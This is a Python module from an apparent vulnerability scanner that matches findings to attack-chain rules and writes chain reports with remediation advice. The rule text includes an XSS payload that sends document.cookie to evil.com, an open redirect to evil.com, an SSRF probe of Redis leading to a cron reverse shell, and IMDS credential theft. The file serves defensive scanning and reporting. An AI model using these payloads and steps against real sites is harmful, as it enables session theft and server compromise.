"""
scanner/chainer.py  v2.2.0
===========================
Enhanced Vulnerability Chaining Engine v2.2.0.
New: 4 additional attack chain rules.
"""

import uuid

from colorama import Fore, Style

from .schema import EVENT_VERSION, SCHEMA_VERSION
from .scan_logger import logger

# Chain rules that need more than type matching (see VulnChainer.analyse).
_CLOUD_SSRF_TAKEOVER_RULE = "Cloud Account Takeover via SSRF + IMDS"

# Enhanced chain rules with more attack paths
CHAIN_RULES = [
    {
        "name": "Full Session Hijack via XSS + Cookie Theft",
        "requires": ["Reflected XSS", "Missing HttpOnly"],
        "severity": "CRITICAL",
        "cvss": 9.6,
        "attack_path": [
            "Attacker identifies Reflected XSS in input parameter",
            "Session cookie lacks HttpOnly flag → accessible via document.cookie",
            "Attacker crafts URL: ?param=<script>fetch('https://evil.com/?c='+document.cookie)</script>",
            "Victim clicks link while authenticated",
            "Browser executes XSS, exfiltrates session cookie to attacker",
            "Attacker replays cookie → full account takeover"
        ],
        "impact": "Complete account takeover for any authenticated user",
        "remediation": "Add HttpOnly flag to cookies; implement Content Security Policy",
    },
    {
        "name": "Database Compromise via SQLi + Error Disclosure",
        "requires": ["SQL Injection", "Information Disclosure"],
        "severity": "CRITICAL",
        "cvss": 9.8,
        "attack_path": [
            "SQL injection detected in parameterised URL",
            "Database error messages reveal table/column names",
            "Attacker uses UNION SELECT to enumerate schema",
            "Full database contents extracted including credentials",
            "Hashed passwords cracked offline",
            "Further lateral movement using stolen credentials"
        ],
        "impact": "Complete database exfiltration; potential RCE via stored procedures",
        "remediation": "Use parameterised queries; disable error messages in production",
    },
    {
        "name": "Remote Code Execution via LFI + Log Poisoning",
        "requires": ["Local File Inclusion", "Information Disclosure"],
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_path": [
            "LFI confirmed — server reads arbitrary local files",
            "Server header reveals web server type and log path",
            "Attacker injects PHP code into User-Agent header",
            "Crafted request logged to access.log",
            "LFI used to include poisoned log file",
            "PHP executes → Remote Code Execution"
        ],
        "impact": "Full server compromise; remote shell access",
        "remediation": "Disable LFI via input validation; restrict log file permissions",
    },
    {
        "name": "Internal Network Pivot via SSRF + Open Ports",
        "requires": ["SSRF", "Open Port"],
        "severity": "CRITICAL",
        "cvss": 9.3,
        "attack_path": [
            "SSRF confirmed — server makes requests to attacker-controlled destinations",
            "Open ports reveal internal services (Redis, Elasticsearch, Docker API)",
            "SSRF used to probe internal ports: ?url=http://127.0.0.1:6379/",
            "Redis responds — attacker writes cron job via Redis SET/CONFIG",
            "Cron job executes — reverse shell obtained as root",
            "Internal network pivot achieved"
        ],
        "impact": "Internal network access; potential cloud metadata compromise",
        "remediation": "Validate and whitelist URLs; disable dangerous protocols",
    },
    {
        "name": "CSRF Bypass via XSS Token Theft",
        "requires": ["Reflected XSS", "CSRF"],
        "severity": "CRITICAL",
        "cvss": 9.0,
        "attack_path": [
            "Reflected XSS on same origin as CSRF-protected form",
            "CSRF protection uses token in hidden form field",
            "Attacker uses XSS to read CSRF token via DOM access",
            "XSS payload extracts token and submits forged request",
            "CSRF protection bypassed",
            "State-changing action executed on behalf of victim"
        ],
        "impact": "CSRF protection completely bypassed; any action exploitable",
        "remediation": "Use SameSite=Strict cookies; implement token binding",
    },
    {
        "name": "Cloud Account Takeover via SSRF + IMDS",
        "requires": ["SSRF", "Information Disclosure"],
        "severity": "CRITICAL",
        "cvss": 9.8,
        "attack_path": [
            "SSRF vulnerability identified",
            "Cloud metadata service accessible at 169.254.169.254",
            "Attacker uses SSRF to fetch IAM credentials",
            "IAM role credentials extracted from response",
            "Attacker uses stolen credentials to access cloud console",
            "Full cloud account compromise"
        ],
        "impact": "Complete AWS/GCP/Azure account takeover",
        "remediation": "Use IMDSv2; implement SSRF whitelisting; disable unused IMDS",
    },
    {
        "name": "Admin Panel Access via Directory Exposure + Weak Credentials",
        "requires": ["Exposed Path", "Weak Authentication"],
        "severity": "HIGH",
        "cvss": 7.5,
        "attack_path": [
            "Directory bruteforce reveals /admin panel",
            "Server/version header discloses software version",
            "Attacker identifies default credentials for that version",
            "Default credentials attempted (admin/admin, admin/password)",
            "Admin panel accessed",
            "Full application compromise"
        ],
        "impact": "Full administrative access to application",
        "remediation": "Remove default credentials; implement MFA; restrict admin paths",
    },
    {
        "name": "Session Fixation via Missing Secure + Plaintext HTTP",
        "requires": ["Plaintext HTTP", "Missing Secure"],
        "severity": "HIGH",
        "cvss": 8.1,
        "attack_path": [
            "Site served over plaintext HTTP",
            "Session cookie lacks Secure flag",
            "Attacker performs MITM attack on same network",
            "All HTTP traffic including cookies intercepted",
            "Session token extracted and replayed",
            "Session hijack without user interaction"
        ],
        "impact": "Session hijack for any user on same network",
        "remediation": "Enforce HTTPS; add Secure flag to cookies; implement HSTS",
    },
    {
        "name": "Cryptographic Failure via Weak SSL + Missing HSTS",
        "requires": ["Weak SSL/TLS", "Missing HSTS"],
        "severity": "HIGH",
        "cvss": 7.4,
        "attack_path": [
            "Server supports weak TLS protocols (TLS 1.0/1.1)",
            "Missing HSTS header allows SSL stripping",
            "Attacker forces downgrade to weak protocol",
            "POODLE/BEAST attack decrypts session traffic",
            "Session tokens extracted",
            "Account compromise"
        ],
        "impact": "Decryption of encrypted traffic; session theft",
        "remediation": "Disable weak protocols; implement HSTS with preload",
    },
    {
        "name": "Data Exfiltration via XXE + SSRF",
        "requires": ["XXE", "SSRF"],
        "severity": "CRITICAL",
        "cvss": 9.3,
        "attack_path": [
            "XXE vulnerability in XML parser",
            "Attacker uses XXE to read local files",
            "SSRF used to exfiltrate data to attacker server",
            "Combined attack: XXE reads file, SSRF sends data",
            "Sensitive data exfiltrated",
            "Internal network reconnaissance"
        ],
        "impact": "Local file disclosure; data exfiltration",
        "remediation": "Disable external entity processing; validate XML input",
    },
    {
        "name": "IDOR → Sensitive Data Access → Account Impact",
        "requires": ["Potential IDOR"],
        "severity": "HIGH",
        "cvss": 7.5,
        "attack_path": [
            "Scanner identifies an ID-like parameter with similar responses across adjacent IDs",
            "Attacker enumerates object IDs (e.g., user_id=1001..)",
            "If authorization checks are missing, attacker accesses other users' records",
            "Sensitive data exposure enables targeted phishing, fraud, or account compromise"
        ],
        "impact": "Unauthorized access to other users' data (depends on endpoint sensitivity)",
        "remediation": "Enforce object-level authorization checks on every request; use indirect object references where appropriate",
        "risk_amplification": "Transforms a single endpoint weakness into bulk data exposure via enumeration.",
    },
    {
        "name": "Missing Headers + XSS → Increased Exploit Reliability",
        "requires": ["Reflected XSS", "Missing Security Header"],
        "severity": "HIGH",
        "cvss": 8.2,
        "attack_path": [
            "Reflected XSS is present on a user-controlled parameter",
            "Missing CSP removes a strong browser-side mitigation layer",
            "Attacker executes payload reliably across browsers/sessions",
            "Session theft / malicious actions become significantly easier"
        ],
        "impact": "Higher likelihood of successful XSS exploitation leading to session theft or account takeover",
        "remediation": "Fix XSS root cause and deploy a strict CSP (nonce/hash-based) as defense-in-depth",
        "risk_amplification": "Defense-in-depth gap increases exploit success rate and impact.",
    },

    # ── NEW CHAINS (v2.2.0) ────────────────────────────────────────────────────
    {
        "name": "Phishing Amplification via Open Redirect + Exposed API",
        "requires": ["Open Redirect", "API Exposure"],
        "severity": "HIGH",
        "cvss": 7.1,
        "attack_path": [
            "Open redirect confirmed on trusted domain (/redirect?url=https://evil.com)",
            "API documentation exposes endpoint structure to attacker",
            "Attacker crafts phishing link: trusted-site.com/redirect?url=evil.com",
            "Victim trusts the URL (legitimate domain prefix)",
            "Victim redirected to cloned login page — credentials harvested",
            "Attacker uses API schema to formulate authenticated requests"
        ],
        "impact": "Highly convincing phishing with real credential harvest; API attack blueprint handed to attacker",
        "remediation": "Remove open redirect; restrict API documentation to authenticated users",
        "risk_amplification": "Legitimate domain trust dramatically increases phishing success rate.",
    },
    {
        "name": "Privilege Escalation via IDOR + Weak Authentication",
        "requires": ["Potential IDOR", "Weak Authentication"],
        "severity": "CRITICAL",
        "cvss": 9.1,
        "attack_path": [
            "IDOR detected — endpoint returns other users data when ID is incremented",
            "Weak authentication (no lockout, no MFA) allows brute-force of low-privilege account",
            "Attacker authenticates as low-privilege user",
            "Attacker enumerates IDs to discover admin account object",
            "Admin object data used to reset credentials or forge admin session",
            "Full privilege escalation to administrator"
        ],
        "impact": "Full administrative takeover via object enumeration and credential reuse",
        "remediation": "Enforce object-level authorisation; implement MFA and rate limiting",
        "risk_amplification": "Two individually moderate flaws combine to achieve critical impact.",
    },
    {
        "name": "Credential Stuffing via Username Enumeration + No Rate Limit",
        "requires": ["Username Enumeration via Login Responses", "Rate Limiting"],
        "severity": "HIGH",
        "cvss": 8.0,
        "attack_path": [
            "Username enumeration confirmed via distinct login responses",
            "Rate limiting absent — no throttling on login endpoint",
            "Attacker builds username list using enumeration",
            "Attacker performs password spraying against confirmed usernames",
            "Common passwords succeed — multiple accounts compromised",
            "Attacker establishes persistent access via stolen credentials"
        ],
        "impact": "Mass account compromise; data breach; regulatory exposure",
        "remediation": "Normalise login responses; implement rate limiting and CAPTCHA on login",
        "risk_amplification": "Enumeration narrows target list; absent rate limit enables automation at scale.",
    },
    {
        "name": "Sensitive Data Leak via SQLi + Missing Encryption",
        "requires": ["SQL Injection", "Plaintext HTTP"],
        "severity": "CRITICAL",
        "cvss": 9.9,
        "attack_path": [
            "SQL injection allows extraction of database contents including PII",
            "Application served over plaintext HTTP — all traffic interceptable",
            "MITM attacker on network path intercepts all HTTP traffic",
            "SQL injection payload injected into legitimate users request",
            "Database returns sensitive data (emails, passwords, PII) to attacker",
            "Dual compromise: database exfiltration + in-transit interception"
        ],
        "impact": "Dual-vector compromise: database dump + traffic interception. Maximum PII/GDPR exposure.",
        "remediation": "Enforce HTTPS + HSTS; use parameterised queries; encrypt sensitive DB fields at rest",
        "risk_amplification": "Both vectors independently critical; combined impact is maximum.",
    },
]


class VulnChainer:
    """
    Enhanced vulnerability chaining engine.

    FIX (v2.2.0 → v2.1.0):
    - Added deduplication of near-identical findings before type matching.
      Multiple near-identical findings (e.g. several Swagger static assets) used to
      inflate the type list; deduplication groups them so each logical class appears
      once. The API module may emit one consolidated Swagger/UI finding; older JSON
      exports may still list per-asset types.
    - Added "waf status" / "no waf" to the type-normalisation map so the No WAF
      Detected informational finding can participate in chains that require it
      (e.g. a future "No WAF + RCE" chain rule).
    - Improved console output: chain severity label colour uses RED for CRITICAL,
      YELLOW for HIGH (was using Fore.YELLOW for both).
    """

    def __init__(self, findings: list[dict]):
        self.findings = findings

    @staticmethod
    def _normalise_type(ftype: str) -> str:
        """
        Return a canonical lower-case type string for chain matching.
        """
        import re as _re
        t = _re.sub(
            r'\s*\((?:POST|GET|Output-Based|Input-Based|Blind|Boolean|Time-Based)\)',
            '', ftype, flags=_re.IGNORECASE
        ).lower().strip()
        
        # Flex-map common variations to canonical keys used in CHAIN_RULES
        mapping = {
            "missing security headers": "missing security header",
            "cross-site scripting": "reflected xss",
            "sql injection": "sql injection",
            "local file inclusion": "local file inclusion",
            "server-side request forgery": "ssrf",
            "cross-site request forgery": "csrf",
            "insecure direct object reference": "potential idor",
            "hidden directory discovery": "exposed path",
            "sensitive file discovery": "exposed path",
            "ssl/tls": "weak ssl/tls",
            "hsts": "missing hsts",
        }
        for pattern, canonical in mapping.items():
            if pattern in t:
                return canonical
        return t

    def _unique_finding_types(self) -> list[str]:
        """
        Return a deduplicated list of normalised finding type strings.

        Deduplication prevents near-identical findings (e.g. four Swagger file
        exposures) from each adding to the type list and padding chain matches.
        """
        seen: set = set()
        types: list = []
        for f in self.findings:
            if f.get("chain"):
                continue
            t = self._normalise_type(f.get("type", ""))
            if t and t not in seen:
                seen.add(t)
                types.append(t)
        return types

    def _related_finding_ids_for_rule(self, rule: dict) -> list[str]:
        out: list[str] = []
        seen: set[str] = set()
        for req in rule["requires"]:
            rl = req.lower()
            for f in self.findings:
                if f.get("chain"):
                    continue
                ft = self._normalise_type(f.get("type", ""))
                if not ft:
                    continue
                if rl in ft:
                    fid = f.get("finding_id")
                    if fid and str(fid) not in seen:
                        seen.add(str(fid))
                        out.append(str(fid))
                    break
        return out

    def _information_disclosure_in_types(self, finding_types: list[str]) -> bool:
        return any("information disclosure" in ft for ft in finding_types)

    def _ssrf_imds_exfil_confirmed(self) -> bool:
        """True if any non-chain SSRF finding has confirmed IMDS/credential exfil."""
        for f in self.findings:
            if f.get("chain"):
                continue
            t = (f.get("type") or "").lower()
            if "server-side request forgery" not in t and "ssrf" not in t:
                continue
            ex = f.get("extra")
            if isinstance(ex, dict) and ex.get("ssrf_imds_exfil_confirmed"):
                return True
        return False

    def _related_finding_ids_cloud_ssrf_takeover(self) -> list[str]:
        """SSRF rows with exfil proof plus one information-disclosure finding."""
        out: list[str] = []
        seen: set[str] = set()
        for f in self.findings:
            if f.get("chain"):
                continue
            t = (f.get("type") or "").lower()
            if "server-side request forgery" not in t and "ssrf" not in t:
                continue
            ex = f.get("extra")
            if not isinstance(ex, dict) or not ex.get("ssrf_imds_exfil_confirmed"):
                continue
            fid = f.get("finding_id")
            if fid and str(fid) not in seen:
                seen.add(str(fid))
                out.append(str(fid))
        for f in self.findings:
            if f.get("chain"):
                continue
            ft = self._normalise_type(f.get("type", ""))
            if "information disclosure" in ft:
                fid = f.get("finding_id")
                if fid and str(fid) not in seen:
                    seen.add(str(fid))
                    out.append(str(fid))
                break
        return out

    def analyse(self, scan_id: str = "") -> list[dict]:
        """Run all chain rules against deduplicated finding types."""
        chain_findings = []
        finding_types  = self._unique_finding_types()

        logger.info(
            "Analysing findings for attack chains",
            extra={"kind": "CHAIN_ANALYSIS", "findings_count": len(self.findings)},
        )

        for rule in CHAIN_RULES:
            if rule["name"] == _CLOUD_SSRF_TAKEOVER_RULE:
                matched = (
                    self._ssrf_imds_exfil_confirmed()
                    and self._information_disclosure_in_types(finding_types)
                )
            else:
                matched = all(
                    any(req.lower() in ft for ft in finding_types)
                    for req in rule["requires"]
                )

            if matched:
                path_text = " -> ".join(rule["attack_path"])
                impact = rule["impact"]
                remediation = rule["remediation"]
                amp = rule.get("risk_amplification", "")

                if rule["name"] == _CLOUD_SSRF_TAKEOVER_RULE:
                    rel_ids = self._related_finding_ids_cloud_ssrf_takeover()
                else:
                    rel_ids = self._related_finding_ids_for_rule(rule)
                chain_finding = {
                    "type": f"VULNERABILITY CHAIN: {rule['name']}",
                    "url": "Multiple URLs (see individual findings)",
                    "parameter": "Chain Analysis",
                    "payload": " + ".join(rule["requires"]),
                    "severity": rule["severity"],
                    "cvss_score": rule.get("cvss", 0),
                    "evidence": (
                        f"ATTACK PATH: {path_text} | "
                        f"IMPACT: {impact} | "
                        f"RISK AMPLIFICATION: {amp} | "
                        f"REMEDIATION: {remediation}"
                    ),
                    "chain": True,
                    "requires": rule["requires"],
                    "attack_steps": rule["attack_path"],
                    "impact_description": impact,
                    "remediation": remediation,
                    "risk_amplification": amp,
                    "chain_id": str(uuid.uuid4()),
                    "scan_id": scan_id or "",
                    "related_finding_ids": rel_ids,
                    "module": "VULNERABILITY CHAINING",
                    "schema_version": SCHEMA_VERSION,
                    "event_version": EVENT_VERSION,
                }

                if rule["severity"] == "CRITICAL":
                    logger.warning(
                        "Critical vulnerability chain detected",
                        extra={
                            "kind": "CHAIN_DETECTED",
                            "severity": rule["severity"],
                            "chain_name": rule["name"],
                        },
                    )
                else:
                    logger.info(
                        "Vulnerability chain detected",
                        extra={
                            "kind": "CHAIN_DETECTED",
                            "severity": rule["severity"],
                            "chain_name": rule["name"],
                        },
                    )

                chain_findings.append(chain_finding)

        if not chain_findings:
            logger.info("No multi-vulnerability chains detected")
        else:
            logger.warning(
                "Attack chains identified",
                extra={"kind": "CHAIN_SUMMARY", "chain_count": len(chain_findings)},
            )

        return chain_findings